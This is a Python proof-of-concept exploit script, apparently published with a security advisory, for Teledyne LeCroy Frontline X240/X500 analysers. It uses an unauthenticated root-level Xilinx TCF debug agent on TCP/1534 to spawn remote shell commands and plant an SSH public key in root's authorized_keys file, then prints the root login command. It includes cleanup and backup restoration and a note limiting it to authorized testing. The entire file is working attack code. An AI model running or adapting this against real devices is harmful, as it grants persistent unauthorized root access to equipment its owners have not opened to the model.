#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-only
"""
x240_tcf_keyplant.py: Safely add an SSH key via the unauthenticated TCF agent.

The Xilinx TCF agent on TCP/1534 runs as root and enforces no authentication. This tool uses its process and filesystem services to preserve any existing authorized_keys file, append one public key without duplication, and record enough state for targeted cleanup or emergency restoration.

If no key is supplied, an RSA keypair is generated locally (./x240_key, ./x240_key.pub) and the private key is chmod 600. RSA is used because the target family runs Dropbear 2017.75, which predates ed25519 support.

Per the TCF Service Locator spec a client Hello is sent at channel open, otherwise the Xilinx agent will not dispatch commands.

Target  : Teledyne LeCroy Frontline X240 / X240i / X500 / X500e
Finding : Unauthenticated TCF debug agent (TCP/1534) running as root
Advisory: TDY-PSG-2026-001 (CVE pending)
Author  : Erwin Karincic (Dollarhyde)

Authorized testing only. Use against equipment you own or are explicitly permitted to test.

Usage:
    python x240_tcf_keyplant.py [host]                     # generate/reuse ./x240_key
    python x240_tcf_keyplant.py [host] --public-key key.pub
    python x240_tcf_keyplant.py --cleanup STATE.json       # remove only the planted key
    python x240_tcf_keyplant.py --restore-backup STATE.json

"""

import argparse
import datetime
import json
import logging
import os
import secrets
import shlex
import socket
import sys
import time
from pathlib import Path

EOM = b"\x03\x01"

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("tcf-keyplant")


class TCFTimeout(Exception):
    pass


class TCFClient:
    def __init__(self, host, port=1534, timeout=10.0):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(timeout)
        self.sock.connect((host, port))
        self.token = 0
        self.buf = b""

        # Announce ourselves so the agent starts dispatching commands.
        self.sock.sendall(b"E\x00Locator\x00Hello\x00[]\x00" + EOM)

        self.sock.settimeout(2.0)
        try:
            while True:
                chunk = self.sock.recv(8192)
                if not chunk:
                    break
                self.buf += chunk
                if EOM in self.buf and len(chunk) < 8192:
                    break
        except (socket.timeout, TimeoutError):
            pass
        while EOM in self.buf:
            idx = self.buf.index(EOM)
            self.buf = self.buf[idx + len(EOM):]

    def call(self, service, command, *args, timeout=5.0):
        self.token += 1
        token = str(self.token).encode()
        parts = [b"C", token, service.encode(), command.encode()]
        for a in args:
            parts.append(json.dumps(a).encode())
        self.sock.sendall(b"\x00".join(parts) + b"\x00" + EOM)

        self.sock.settimeout(timeout)
        while True:
            while EOM not in self.buf:
                try:
                    chunk = self.sock.recv(8192)
                except (socket.timeout, TimeoutError):
                    raise TCFTimeout(f"{service}.{command} timed out after {timeout}s")
                if not chunk:
                    raise IOError("connection closed by agent")
                self.buf += chunk
            idx = self.buf.index(EOM)
            reply, self.buf = self.buf[:idx], self.buf[idx + len(EOM):]
            fields = reply.split(b"\x00")
            if fields and fields[0] == b"R" and len(fields) >= 4 and fields[1] == token:
                def _decode(b):
                    if not b:
                        return None
                    try:
                        return json.loads(b.decode())
                    except (json.JSONDecodeError, UnicodeDecodeError):
                        return b.decode(errors="replace")
                return _decode(fields[2]), _decode(fields[3])

    def safe_call(self, service, command, *args, timeout=5.0):
        try:
            return self.call(service, command, *args, timeout=timeout)
        except TCFTimeout:
            return ("timeout", None)
        except IOError as e:
            return (f"ioerror: {e}", None)


def keygen_rsa(priv: Path, pub: Path, comment: str) -> bytes:
    # RSA, not ed25519: the target family runs Dropbear 2017.75, which predates
    # ed25519 support (added in Dropbear 2020.79), so an ed25519 key cannot log in.
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    k = rsa.generate_private_key(public_exponent=65537, key_size=3072)
    private_bytes = k.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.OpenSSH,
        encryption_algorithm=serialization.NoEncryption(),
    )
    fd = os.open(priv, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    with os.fdopen(fd, "wb") as fh:
        fh.write(private_bytes)
    pubb = k.public_key().public_bytes(
        encoding=serialization.Encoding.OpenSSH,
        format=serialization.PublicFormat.OpenSSH,
    )
    pub.write_bytes(pubb + b" " + comment.encode() + b"\n")
    try:
        os.chmod(priv, 0o600)
    except OSError:
        pass
    return pub.read_bytes()


def secure_json_write(path: Path, data):
    path.write_text(json.dumps(data, indent=2) + "\n")
    os.chmod(path, 0o600)


def stat_attrs(tcf, path):
    err, attrs = tcf.safe_call("FileSystem", "stat", path, timeout=4.0)
    return attrs if err is None and isinstance(attrs, dict) else None


def process_accepted(err, result):
    # The agent returns the spawned process under "ID"; some builds use "ProcessID".
    return err is None and isinstance(result, dict) and (result.get("ID") or result.get("ProcessID")) is not None


def start_shell(tcf, command):
    err, result = tcf.safe_call(
        "ProcessesV1", "start", "/tmp", "/bin/sh",
        ["sh", "-c", command], [], {"Attach": False}, timeout=8.0,
    )
    if process_accepted(err, result):
        return True
    log.info(f"  ProcessesV1.start failed (err={err}); trying Processes.start")
    err, result = tcf.safe_call(
        "Processes", "start", "/tmp", "/bin/sh",
        ["sh", "-c", command], [], False, timeout=8.0,
    )
    return process_accepted(err, result)


def run_shell_and_wait(tcf, command, timeout=12.0, recognize_duplicate=False):
    """Run a remote shell operation and wait for a one-byte success marker."""
    marker = f"/tmp/x240_keyplant_status_{secrets.token_hex(6)}"
    qmarker = shlex.quote(marker)
    duplicate_case = f"elif [ $rc -eq 3 ]; then printf DUP > {qmarker}; " if recognize_duplicate else ""
    wrapped = (
        f"( {command} ); rc=$?; "
        f"if [ $rc -eq 0 ]; then printf S > {qmarker}; "
        f"{duplicate_case}else printf FAILURE > {qmarker}; fi"
    )
    if not start_shell(tcf, wrapped):
        return False, "TCF agent did not accept the process"
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        attrs = stat_attrs(tcf, marker)
        if attrs is not None:
            try:
                size = int(attrs.get("Size", -1))
            except (TypeError, ValueError):
                size = -1
            tcf.safe_call("FileSystem", "remove", marker, timeout=2.0)
            if size == 1:
                return True, None
            if recognize_duplicate and size == 3:
                return True, "duplicate"
            if size == 7:
                return False, "remote shell operation reported failure"
        time.sleep(0.25)
    return False, f"timed out waiting for remote completion marker {marker}"


def connect_tcf(host):
    log.info(f"Connecting to TCF agent at {host}:1534 ...")
    try:
        return TCFClient(host)
    except OSError as e:
        log.error(f"Connection failed: {e}")
        sys.exit(1)


def locate_home(tcf):
    home = None
    for candidate in ["/home/root", "/root", "/home/petalinux", "/home/xilinx"]:
        attrs = stat_attrs(tcf, candidate)
        if attrs is not None:
            log.info(f"stat({candidate}): exists -> {attrs}")
            home = home or candidate
        else:
            log.info(f"stat({candidate}): unavailable")
    return home


def confirm(prompt, assume_yes):
    return assume_yes or input(f"{prompt} [y/N] ").strip().lower() == "y"


def load_state(path):
    try:
        state = json.loads(Path(path).read_text())
    except (OSError, json.JSONDecodeError) as e:
        raise ValueError(f"cannot read state file: {e}") from e
    required = {"host", "target", "public_key", "created_target"}
    if not required.issubset(state):
        raise ValueError(f"state file is missing: {', '.join(sorted(required - set(state)))}")
    return state


def cleanup(tcf, state):
    target = state["target"]
    key = state["public_key"]
    tmp = f"{target}.x240-cleanup-{secrets.token_hex(4)}"
    edit_command = (
        f"if grep -F -x -v {shlex.quote(key)} {shlex.quote(target)} > {shlex.quote(tmp)}; "
        "then :; else rc=$?; [ $rc -eq 1 ] || exit $rc; fi; "
        f"chmod 600 {shlex.quote(tmp)}; mv {shlex.quote(tmp)} {shlex.quote(target)}; "
        + (f"[ -s {shlex.quote(target)} ] || rm -f {shlex.quote(target)}; "
           if state["created_target"] else "")
    )
    if state["created_target"]:
        command = (
            f"set -e; if [ -f {shlex.quote(target)} ]; then {edit_command} fi"
        )
    else:
        command = (
            f"set -e; test -f {shlex.quote(target)}; {edit_command}"
            + (f"rm -f {shlex.quote(state['backup_remote'])}"
               if state.get("backup_remote") else ":")
        )
    return run_shell_and_wait(tcf, command)


def restore_backup(tcf, state):
    backup = state.get("backup_remote")
    if not backup:
        return False, "this state has no pre-existing authorized_keys backup"
    command = (
        f"test -f {shlex.quote(backup)} && "
        f"cp -p {shlex.quote(backup)} {shlex.quote(state['target'])} && "
        f"rm -f {shlex.quote(backup)}"
    )
    return run_shell_and_wait(tcf, command)


def success(priv, host, state_path):
    log.info("=" * 70)
    log.info("Log in with the planted key:")
    if priv is not None:
        log.info(f"  ssh -i {priv.absolute()} -o StrictHostKeyChecking=accept-new root@{host}")
    else:
        log.info(f"  ssh -i <matching-private-key> -o StrictHostKeyChecking=accept-new root@{host}")
    log.info(f"Cleanup state: {state_path}")
    log.info(f"  python {Path(__file__).name} --cleanup {state_path}")
    log.info("=" * 70)


def main():
    ap = argparse.ArgumentParser(description="Safely add and remove a root SSH key through TCF")
    ap.add_argument("host", nargs="?", help="target host (default: 10.10.0.240)")
    ap.add_argument("--public-key", type=Path, help="existing OpenSSH public-key file")
    actions = ap.add_mutually_exclusive_group()
    actions.add_argument("--cleanup", metavar="STATE", help="remove only the key recorded in STATE")
    actions.add_argument("--restore-backup", metavar="STATE",
                         help="replace authorized_keys with its recovery backup")
    ap.add_argument("--yes", action="store_true", help="skip the target-mutation confirmation")
    args = ap.parse_args()

    if args.cleanup or args.restore_backup:
        state_path = Path(args.cleanup or args.restore_backup)
        try:
            state = load_state(state_path)
        except ValueError as e:
            ap.error(str(e))
        host = args.host or state["host"]
        action = "remove only the planted key" if args.cleanup else "restore the full recovery backup"
        if not confirm(f"About to {action} on {host}.", args.yes):
            log.info("Aborted.")
            return
        tcf = connect_tcf(host)
        ok, err = cleanup(tcf, state) if args.cleanup else restore_backup(tcf, state)
        if not ok:
            log.error(f"Operation failed: {err}")
            sys.exit(1)
        state["cleanup_action"] = "key_removed" if args.cleanup else "backup_restored"
        state["cleanup_at"] = datetime.datetime.now().isoformat()
        secure_json_write(state_path, state)
        log.info("Remote cleanup completed successfully.")
        return

    host = args.host or "10.10.0.240"
    priv = None
    if args.public_key:
        pub = args.public_key
        try:
            pubkey_line = pub.read_bytes().strip() + b"\n"
        except OSError as e:
            ap.error(f"cannot read public key: {e}")
    else:
        priv, pub = Path("x240_key"), Path("x240_key.pub")
        if not priv.exists():
            comment = f"x240-access-{datetime.datetime.now().strftime('%Y%m%d')}"
            pubkey_line = keygen_rsa(priv, pub, comment)
            log.info(f"Generated keypair: {priv} / {pub}")
        else:
            if not pub.exists():
                ap.error(f"{priv} exists but matching public key {pub} does not")
            pubkey_line = pub.read_bytes().strip() + b"\n"
            log.info(f"Reusing keypair: {priv}")
    stripped_key = pubkey_line.strip()
    if b"\n" in stripped_key or b"\r" in stripped_key or b"\x00" in stripped_key:
        ap.error("public-key file must contain exactly one key line")
    if not stripped_key.startswith((b"ssh-ed25519 ", b"ssh-rsa ", b"ecdsa-sha2-")):
        ap.error("public key is not in a recognized OpenSSH format")
    key_text = pubkey_line.decode("utf-8", "strict").strip()
    log.info(f"Public key: {pubkey_line.decode().strip()}")

    tcf = connect_tcf(host)
    home = locate_home(tcf)

    if home is None:
        log.error("No home dir was stat-able. Check the mirrored /etc/passwd for root's home.")
        sys.exit(1)
    log.info(f"Using home: {home}")

    ssh_dir = f"{home}/.ssh"
    target = f"{ssh_dir}/authorized_keys"
    stat_err, target_attrs = tcf.safe_call("FileSystem", "stat", target, timeout=4.0)
    if stat_err in ("timeout",) or (isinstance(stat_err, str) and stat_err.startswith("ioerror:")):
        log.error(f"Could not determine whether {target} exists: {stat_err}")
        sys.exit(1)
    existed = stat_err is None and isinstance(target_attrs, dict)
    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    unique = secrets.token_hex(3)
    backup = f"{target}.x240-poc-backup-{stamp}-{unique}" if existed else None
    log.info(f"Target: {target} ({'exists; will be backed up' if existed else 'will be created'})")
    if not confirm(f"About to append one root SSH key on {host} without replacing existing keys.", args.yes):
        log.info("Aborted; no remote change was made.")
        return

    commands = [
        (
            f"if [ -f {shlex.quote(target)} ] && "
            f"grep -F -x {shlex.quote(key_text)} {shlex.quote(target)} >/dev/null; then exit 3; fi"
        ),
        "umask 077",
        f"mkdir -p {shlex.quote(ssh_dir)}",
        f"chmod 700 {shlex.quote(ssh_dir)}",
    ]
    if backup:
        commands.append(f"cp -p {shlex.quote(target)} {shlex.quote(backup)}")
        commands.append(f"chmod 600 {shlex.quote(backup)}")
    commands.extend([
        f"touch {shlex.quote(target)}",
        (
            f"grep -F -x {shlex.quote(key_text)} {shlex.quote(target)} >/dev/null || "
            f"printf '%s\\n' {shlex.quote(key_text)} >> {shlex.quote(target)}"
        ),
        f"chmod 600 {shlex.quote(target)}",
    ])
    install_command = commands[0] + "; " + " && ".join(commands[1:])
    ok, err = run_shell_and_wait(tcf, install_command, recognize_duplicate=True)
    if ok and err == "duplicate":
        log.info("The exact public key is already present; no remote change was made.")
        return
    if not ok:
        log.error(f"Key installation failed: {err}")
        if backup and stat_attrs(tcf, backup) is not None:
            log.warning("Attempting to restore the pre-change authorized_keys backup.")
            restored, restore_err = run_shell_and_wait(
                tcf,
                f"cp -p {shlex.quote(backup)} {shlex.quote(target)} && rm -f {shlex.quote(backup)}",
            )
            if not restored:
                log.error(f"Automatic backup restoration failed: {restore_err}; backup: {backup}")
        elif not existed:
            run_shell_and_wait(tcf, f"rm -f {shlex.quote(target)}")
        sys.exit(1)

    state = {
        "host": host,
        "target": target,
        "public_key": key_text,
        "created_target": not existed,
        "backup_remote": backup,
        "created_at": datetime.datetime.now().isoformat(),
    }
    state_path = Path(f"x240_tcf_keyplant_{stamp}_{unique}.json")
    try:
        secure_json_write(state_path, state)
    except OSError as e:
        log.error(f"Could not save cleanup state ({e}); reverting the remote key change.")
        reverted, revert_err = cleanup(tcf, state)
        if not reverted:
            log.error(f"Automatic reversion failed: {revert_err}")
            if backup:
                log.error(f"Remote recovery backup: {backup}")
        sys.exit(1)
    log.info("Key present; existing keys were preserved.")
    if backup:
        log.info(f"Remote recovery backup: {backup}")
    success(priv, host, state_path)


if __name__ == "__main__":
    main()
